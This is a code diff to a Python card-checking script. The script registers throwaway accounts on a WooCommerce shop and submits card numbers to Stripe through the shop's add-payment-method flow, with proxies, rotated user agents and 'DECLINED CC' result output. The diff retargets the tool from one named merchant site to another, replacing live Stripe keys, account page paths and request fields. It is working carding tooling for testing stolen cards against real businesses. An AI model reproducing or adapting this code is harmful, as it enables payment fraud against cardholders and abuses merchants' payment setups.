@@ -35,8 +35,8 @@ stripe_headers = {
 }
 
 # Configuration from autostripe-api.py
-BASE_URL = "https://iconichairproducts.com"
-STRIPE_KEY = "pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs"
+BASE_URL = "https://chilliwackfishandgame.com/"
+STRIPE_KEY = "pk_live_dqqoLyQS1I311an1MOzKNOU800LttYjqLf"
 
 def get_rotating_user_agent():
     agents = [
@@ -312,11 +312,11 @@ def get_country_emoji_from_name(country_name):
     return ''
 
 def initialize_cookies(session, proxy_str):
-    """Initialize cookies by visiting the my-account page"""
+    """Initialize cookies by visiting the my-account-2 page"""
     try:
         proxies = parse_proxy(proxy_str) if proxy_str else None
         response = session.get(
-            f"{BASE_URL}/my-account/", 
+            f"{BASE_URL}/my-account-2/", 
             timeout=30, 
             verify=False,
             allow_redirects=True,
@@ -337,7 +337,7 @@ def extract_wp_referer(html_content):
     """Extract _wp_http_referer from HTML"""
     pattern = r'name="_wp_http_referer" value="([^"]+)"'
     match = re.search(pattern, html_content)
-    return match.group(1) if match else "/my-account/"
+    return match.group(1) if match else "/my-account-2/"
 
 def is_logged_in(html_content):
     """Check if registration was successful by looking for MyAccount navigation"""
@@ -370,7 +370,7 @@ def register_account(session, proxy_str):
         
         # Step 1: Get the registration page to extract nonce
         response = session.get(
-            f"{BASE_URL}/my-account/", 
+            f"{BASE_URL}/my-account-2/", 
             timeout=30, 
             verify=False,
             proxies=proxies
@@ -388,7 +388,7 @@ def register_account(session, proxy_str):
         registration_data = {
             'email': email,
             'wc_order_attribution_source_type': 'typein',
-            'wc_order_attribution_referrer': 'https://iconichairproducts.com/my-account/payment-methods/',
+            'wc_order_attribution_referrer': 'https://chilliwackfishandgame.com/my-account-2/payment-methods/',
             'wc_order_attribution_utm_campaign': '(none)',
             'wc_order_attribution_utm_source': '(direct)',
             'wc_order_attribution_utm_medium': '(none)',
@@ -398,7 +398,7 @@ def register_account(session, proxy_str):
             'wc_order_attribution_utm_source_platform': '(none)',
             'wc_order_attribution_utm_creative_format': '(none)',
             'wc_order_attribution_utm_marketing_tactic': '(none)',
-            'wc_order_attribution_session_entry': 'https://iconichairproducts.com/my-account/add-payment-method/',
+            'wc_order_attribution_session_entry': 'https://chilliwackfishandgame.com/my-account-2/add-payment-method/',
             'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
             'wc_order_attribution_session_pages': '5',
             'wc_order_attribution_session_count': '1',
@@ -428,7 +428,7 @@ def register_account(session, proxy_str):
         })
         
         response = session.post(
-            f"{BASE_URL}/my-account/",
+            f"{BASE_URL}/my-account-2/",
             data=registration_data,
             timeout=30,
             verify=False,
@@ -515,7 +515,7 @@ def get_payment_nonce(session, proxy_str):
         proxies = parse_proxy(proxy_str) if proxy_str else None
         
         response = session.get(
-            f"{BASE_URL}/my-account/add-payment-method/",
+            f"{BASE_URL}/my-account-2/add-payment-method/",
             timeout=30,
             verify=False,
             proxies=proxies
@@ -670,7 +670,7 @@ DECLINED CC ❌
             }
 
             # Prepare Stripe data
-            data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy_stripe}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&payment_user_agent=stripe.js%2Fdda83de495%3B+stripe-js-v3%2Fdda83de495%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Ficonichairproducts.com&time_on_page=22151&guid=59935264-a0ad-467b-8c25-e05e6e3941cb5cb1d3&muid=efadee54-caa2-4cbe-abfb-304d69bc865c187523&sid=b8c63ed0-7922-46ba-83f7-2260590ce31aa73df1&key={STRIPE_KEY}&_stripe_account=acct_1JmxDb2Hh2LP7rQY'
+            data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy_stripe}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&payment_user_agent=stripe.js%2Fdda83de495%3B+stripe-js-v3%2Fdda83de495%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fchilliwackfishandgame.com&time_on_page=22151&guid=59935264-a0ad-467b-8c25-e05e6e3941cb5cb1d3&muid=efadee54-caa2-4cbe-abfb-304d69bc865c187523&sid=b8c63ed0-7922-46ba-83f7-2260590ce31aa73df1&key={STRIPE_KEY}&_stripe_account=acct_1JmxDb2Hh2LP7rQY'
 
             proxies = parse_proxy(proxy_str) if proxy_str else None
             response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=30, proxies=proxies, verify=False)
@@ -716,12 +716,12 @@ DECLINED CC ❌
             
             # Second request - Create setup intent
             headers2 = {
-                'authority': 'iconichairproducts.com',
+                'authority': 'chilliwackfishandgame.com',
                 'accept': '*/*',
                 'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                 'content-type': 'application/x-www-form-urlencoded',
-                'origin': 'https://iconichairproducts.com',
-                'referer': 'https://iconichairproducts.com/my-account/add-payment-method/',
+                'origin': 'https://chilliwackfishandgame.com',
+                'referer': 'https://chilliwackfishandgame.com/my-account-2/add-payment-method/',
                 'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                 'sec-ch-ua-mobile': '?1',
                 'sec-ch-ua-platform': '"Android"',
@@ -734,12 +734,12 @@ DECLINED CC ❌
 
             form_data = {
                 'action': 'create_setup_intent',
-                'wcpay-payment-method': pid,
+                'wc-stripe-payment-method': pid,
                 '_ajax_nonce': ajax_nonce
             }
 
             response2 = session.post(
-                'https://iconichairproducts.com/wp-admin/admin-ajax.php',
+                'https://chilliwackfishandgame.com/wp-admin/admin-ajax.php',
                 headers=headers2,
                 data=form_data,
                 timeout=30,
